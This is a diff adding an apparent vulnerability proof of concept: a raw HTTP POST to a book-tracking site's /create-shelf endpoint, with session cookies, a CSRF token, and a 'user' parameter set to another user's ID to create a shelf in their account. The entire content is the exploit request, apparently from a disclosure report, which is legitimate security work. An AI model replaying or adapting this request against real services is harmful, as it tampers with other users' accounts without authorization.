@@ -1,0 +1,20 @@
+Proof of Concept：
+POST /create-shelf HTTP/2
+Host: book.dansmonorage.blue
+Cookie: csrftoken=ZpIuGbCcxOyhta5bki4N46N7vknEAcpaG3881kcMAfWKBEYKEiLEeSc3Sr4lUTVa; django_language=en-us; sessionid=eehh5ghe5q98xephiv46onn3jixdgx7p
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: https://book.dansmonorage.blue/user/nhienit2010/books
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 156
+Origin: https://book.dansmonorage.blue
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+
+csrfmiddlewaretoken=aCHsAiZx3GMVTl4XkpU7hpChuv6mePSLRg76Vrz767ao1PXwEpBYrb1dRCN3ywoL&user=<others id>&name=from-other-user&description=133123123123&privacy=public
